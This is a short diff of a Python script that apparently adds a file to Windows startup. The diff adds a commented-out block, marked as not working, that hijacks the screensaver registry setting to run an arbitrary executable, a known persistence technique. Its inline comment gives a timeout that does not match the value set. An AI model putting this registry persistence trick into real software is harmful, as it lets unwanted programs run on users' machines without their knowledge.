@@ -32,6 +32,14 @@ def add_to_startup():
             print("failed", key)
             pass
 
+    # Attempt to set a file to run when the screensaver activates -- didn't work
+    '''
+    with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, reg.KEY_SET_VALUE) as key:
+        reg.SetValueEx(key, "SCRNSAVE.EXE", 0, reg.REG_SZ, file_path) # Set SCRNSAVE.EXE to another executable
+        reg.SetValueEx(key, "ScreenSaveActive", 0, reg.REG_SZ, "1") # Activate screensaver (1 = active)
+        reg.SetValueEx(key, "ScreenSaveTimeOut", 0, reg.REG_SZ, "15")  # Set activation timeout to 60 seconds
+    '''
+
 if __name__ == "__main__":
     create_file()
     add_to_startup()
